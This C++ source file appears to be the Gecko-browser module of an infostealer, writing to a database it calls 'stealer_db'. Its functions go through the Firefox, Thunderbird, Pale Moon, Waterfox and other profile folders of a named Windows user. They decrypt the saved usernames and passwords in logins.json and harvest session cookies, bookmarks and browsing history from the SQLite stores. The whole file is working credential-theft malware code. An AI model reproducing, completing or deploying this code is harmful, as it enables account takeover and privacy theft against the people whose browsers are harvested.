#include "includes\GeckoParser.h"

std::string gecko_paths = "AppData\\Roaming\\";
std::vector<std::string> browsers_gecko = {
	"Mozilla\\Firefox\\",
	"Thunderbird\\",
	"Mozilla\\SeaMonkey\\",
	"NETGATE Technologies\\BlackHawk\\",
	"8pecxstudios\\Cyberfox\\",
	"K-Meleon\\",
	"Mozilla\\icecat\\",
	"Moonchild Productions\\Pale Moon\\",
	"Comodo\\IceDragon\\",
	"Waterfox\\", 
	"Postbox\\",
	"Flock\\Browser\\"
};

BOOL gecko_parser(std::string username, std::string stealer_db)
{
	std::vector<DataHolder> data_list;

	std::string target_user_data;
	for (const auto& dir : browsers_gecko) {
		target_user_data = "C:\\users\\" + username + "\\" + gecko_paths + dir + "Profiles";
		try {
			if (exists(target_user_data) && is_directory(target_user_data)) {
				for (const auto& entry : directory_iterator(target_user_data)) {
					if (entry.is_directory() && exists(entry.path() / "logins.json")) {

						// Read the JSON file
						std::ifstream file(entry.path() / "logins.json");
						if (!file.is_open()) {
							std::cerr << "Failed to open file.\n";
							return false;
						}

						// Parse the JSON
						json data;
						file >> data;

						// Create decryptor object
						GeckoDecryptor obj;
						std::string program_dir = get_gecko_program_dir(entry.path().string());

						if (!obj.GeckoDecryptorInit(program_dir)) { continue; }

						if (!obj.set_profile_dir(entry.path().string())) { continue; }

						// Loop through all logins
						for (const auto& login : data["logins"]) {

							DataHolder data;

							// Extract fields for each login
							std::string hostname = login["hostname"];
							std::string username = login["encryptedUsername"];
							std::string password = login["encryptedPassword"];

							//data_array[data_index].setUrl(hostname);
							data.get_password_manager().setUrl(hostname);

							obj.decrypt_data(username, username);
							obj.decrypt_data(password, password);

							data.get_password_manager().setUsername(username);
							data.get_password_manager().setPassword(password);
							data.get_password_manager().setHost(dir);

							data_list.push_back(data);
						}
					}
				}
			}
		}
		catch (const std::filesystem::filesystem_error& e) {
			//std::cerr << "Filesystem error: " << e.what() << '\n';
			continue;
		}
		catch (const std::exception& e) {
			//std::cerr << "General exception: " << e.what() << '\n';
			continue;
		}
	}

	if (data_list.size() == 0)
		return false;

	if (!dump_password_data(stealer_db, data_list, data_list.size()))
		return false;

	return true;
}

BOOL gecko_cookie_collector(std::string username, std::string stealer_db)
{
	std::vector<DataHolder> data_list;

	std::string target_user_data;
	std::string target_cookie_data;
	for (const auto& dir : browsers_gecko) {

		target_user_data = "C:\\users\\" + username + "\\" + gecko_paths + dir + "Profiles";
		try {
			if (exists(target_user_data) && is_directory(target_user_data)) {
				for (const auto& entry : directory_iterator(target_user_data)) {
					if (entry.is_directory() && exists(entry.path() / "cookies.sqlite")) {
						//std::cout << entry.path() << '\n';

						target_cookie_data = entry.path().string() + "\\cookies.sqlite";
						sqlite3_stmt* stmt = query_database(target_cookie_data, "SELECT  host, name, path, value, expiry FROM moz_cookies");

						if (stmt == nullptr)
							continue;

						while (sqlite3_step(stmt) == SQLITE_ROW)
						{
							DataHolder data;

							char* host = (char*)sqlite3_column_text(stmt, 0);
							char* name = (char*)sqlite3_column_text(stmt, 1);
							char* path = (char*)sqlite3_column_text(stmt, 2);
							char* value = (char*)sqlite3_column_text(stmt, 3);
							char* expiry = (char*)sqlite3_column_text(stmt, 4);

							if (host != nullptr && name != nullptr && path != nullptr && value != nullptr && expiry != nullptr) {

								data.get_cookies_manager().setUrl(host);
								data.get_cookies_manager().setHost(dir);
								data.get_cookies_manager().setCookieName(name);
								data.get_cookies_manager().setCookies(value);
								data.get_cookies_manager().setCookiesExpiry(expiry);

								data_list.push_back(data);
							}
							else {
								// Handle the case where no data is fetched
								continue;
							}
						}
					}
				}
			}
		}
		catch (const std::filesystem::filesystem_error& e) {
			//std::cerr << "Filesystem error: " << e.what() << '\n';
			continue;
		}
		catch (const std::exception& e) {
			//std::cerr << "General exception: " << e.what() << '\n';
			continue;
		}
	}

	if (data_list.size() == 0)
		return false;

	if (!dump_cookie_data(stealer_db, data_list, data_list.size()))
		return false;

	return true;
}

std::string get_gecko_program_dir(std::string target_user_data)
{
	std::ifstream file(target_user_data + "\\compatibility.ini");
	if (!file.is_open()) {
		//std::cerr << "Could not open the file" << std::endl;
		return "";
	}

	std::string line;
	const std::string key = "LastPlatformDir=";
	while (std::getline(file, line)) {
		if (line.compare(0, key.size(), key) == 0) {
			// Found the key, extract the value
			return line.substr(key.size());
		}
	}

	std::cerr << "LastPlatformDir not found in the file" << std::endl;
	return "";
}

BOOL gecko_bookmarks_collector(std::string username, std::string stealer_db)
{
	//This is actually Gecko History Collector
	std::vector<DataHolder> data_list;

	std::string target_user_data;
	std::string target_bookmark_data;
	for (const auto& dir : browsers_gecko) {

		target_user_data = "C:\\users\\" + username + "\\" + gecko_paths + dir + "Profiles";
		try {
			if (exists(target_user_data) && is_directory(target_user_data)) {
				for (const auto& entry : directory_iterator(target_user_data)) {
					if (entry.is_directory() && exists(entry.path() / "places.sqlite")) {
						//std::cout << entry.path() << '\n';

						target_bookmark_data = entry.path().string() + "\\places.sqlite";
						sqlite3_stmt* stmt = query_database(target_bookmark_data, "SELECT  fk, title, dateAdded FROM moz_bookmarks");

						if (stmt == nullptr)
							continue;

						while (sqlite3_step(stmt) == SQLITE_ROW)
						{
							DataHolder data;

							char* fk = (char*)sqlite3_column_text(stmt, 0);
							char* title = (char*)sqlite3_column_text(stmt, 1);
							char* dateAdded = (char*)sqlite3_column_text(stmt, 2);
							char* url = nullptr;

							if (fk != nullptr && title != nullptr && dateAdded !=nullptr) {

								if ((strlen(fk) == 0) || (strlen(title) == 0))
									continue;

								//Get URL using the foreign key from urls table
								const char *str1 = "SELECT url FROM moz_places WHERE id = ";
								int totalLength = strlen(str1) + strlen(fk) + 1;
								char* query = (char*)malloc(totalLength);

								if (query == NULL) {
									continue;
								}

								// Use snprintf for safer string concatenation
								snprintf(query, totalLength, "%s%s", str1, fk);

								sqlite3_stmt* stmt2 = query_database(target_bookmark_data, query);
								free(query);

								if (stmt2 == nullptr)
									continue;

								if (sqlite3_step(stmt2) == SQLITE_ROW)
								{
									url = (char*)sqlite3_column_text(stmt2, 0);
								}

								if (url == nullptr)
									continue;

								data.get_bookmarks_manager().setUrl(url);
								data.get_bookmarks_manager().setHost(dir);
								data.get_bookmarks_manager().setName(title);
								data.get_bookmarks_manager().setDateAdded(dateAdded);

								data_list.push_back(data);
							}
							else {
								// Handle the case where no data is fetched
								continue;
							}
						}
					}
				}
			}
		}
		catch (const std::filesystem::filesystem_error& e) {
			//std::cerr << "Filesystem error: " << e.what() << '\n';
			continue;
		}
		catch (const std::exception& e) {
			//std::cerr << "General exception: " << e.what() << '\n';
			continue;
		}
	}

	if (data_list.size() == 0)
		return false;

	if (!dump_bookmark_data(stealer_db, data_list, data_list.size()))
		return false;

	return true;
}

BOOL gecko_history_collector(std::string username, std::string stealer_db)
{
	//This is actually Gecko History Collector
	std::vector<DataHolder> data_list;

	std::string target_user_data;
	std::string target_history_data;
	for (const auto& dir : browsers_gecko) {

		target_user_data = "C:\\users\\" + username + "\\" + gecko_paths + dir + "Profiles";
		try {
			if (exists(target_user_data) && is_directory(target_user_data)) {
				for (const auto& entry : directory_iterator(target_user_data)) {
					if (entry.is_directory() && exists(entry.path() / "places.sqlite")) {
						//std::cout << entry.path() << '\n';

						target_history_data = entry.path().string() + "\\places.sqlite";
						sqlite3_stmt* stmt = query_database(target_history_data, "SELECT  url, title, visit_count, last_visit_date FROM moz_places");

						if (stmt == nullptr)
							continue;

						while (sqlite3_step(stmt) == SQLITE_ROW)
						{
							DataHolder data;

							char* url = (char*)sqlite3_column_text(stmt, 0);
							char* title = (char*)sqlite3_column_text(stmt, 1);
							char* visit_count = (char*)sqlite3_column_text(stmt, 2);
							char* last_visit_date = (char*)sqlite3_column_text(stmt, 3);

							if (url != nullptr && title != nullptr && visit_count != nullptr && last_visit_date != nullptr) {

								data.get_history_manager().setUrl(url);
								data.get_history_manager().setHost(dir);
								data.get_history_manager().setTitle(title);
								data.get_history_manager().setLastVisitTime(last_visit_date);
								data.get_history_manager().setVisitCount(visit_count);

								data_list.push_back(data);
							}
							else {
								// Handle the case where no data is fetched
								continue;
							}
						}
					}
				}
			}
		}
		catch (const std::filesystem::filesystem_error& e) {
			//std::cerr << "Filesystem error: " << e.what() << '\n';
			continue;
		}
		catch (const std::exception& e) {
			//std::cerr << "General exception: " << e.what() << '\n';
			continue;
		}
	}

	if (data_list.size() == 0)
		return false;

	if (!dump_history_data(stealer_db, data_list, data_list.size()))
		return false;

	return true;
}